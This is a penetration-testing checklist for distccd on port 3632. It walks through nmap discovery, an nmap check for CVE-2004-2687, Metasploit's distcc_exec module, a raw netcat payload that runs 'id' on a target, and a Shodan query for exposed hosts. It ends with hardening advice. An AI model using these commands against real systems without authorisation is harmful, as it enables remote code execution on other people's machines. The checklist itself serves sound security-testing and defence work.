# Distcc Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating distcc (port 3632), I realistically expect to find:

- [ ] Misconfigured distccd daemon accepting arbitrary commands
- [ ] Ability to execute remote code (CVE-2004-2687)
- [ ] Potential lateral movement pivot via compromised host

---

## ‚úÖ Distcc Pentest Checklist

- [ ] **Service Discovery**
  - Confirm the service is running on 3632/tcp.
    ```
    nmap -Pn -sV -p3632 <IP>
    ```

- [ ] **Banner Grabbing**
  - Identify distccd version and confirm accessibility.
    ```
    nc <IP> 3632
    ```

- [ ] **Vulnerability Check (CVE-2004-2687)**
  - Run quick command execution test.
    ```
    nmap -p 3632 <IP> --script distcc-exec --script-args="distcc-exec.cmd='id'"
    ```

---

## ‚úÖ Exploitation with Metasploit

- [ ] Use exploit module for RCE:
    ```
    msf6 > use exploit/unix/misc/distcc_exec
    msf6 exploit(unix/misc/distcc_exec) > set RHOSTS <IP>
    msf6 exploit(unix/misc/distcc_exec) > set CMD id
    msf6 exploit(unix/misc/distcc_exec) > run
    ```

---

## ‚úÖ Manual Exploitation Example

- [ ] Using custom Python or Netcat:
    - Example payload from public gist:
      ```
      'DIST00000001ARGC00000002ARGV00000002shARGV00000003-cARGV00000008id;exit'
      ```
    - Send it with:
      ```
      echo -ne 'DIST00000001ARGC00000002ARGV00000002shARGV00000003-cARGV00000008id;exit' | nc <IP> 3632
      ```

---

## ‚úÖ Shodan Dork

- No standardized Shodan detection signature.
- Alternative manual search:
    ```
    port:3632
    ```

---

## ‚úÖ Metasploit References

- Module docs:  
  [Rapid7 Distcc Exec](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec)

- Example public PoC:
  [Gist by DarkCoderSc](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)

---

## ‚úÖ Recommendations

- Ensure distccd requires access controls (IP whitelisting).
- Disable or firewall unused services on port 3632.
- Audit and remove legacy or unnecessary distccd installations.
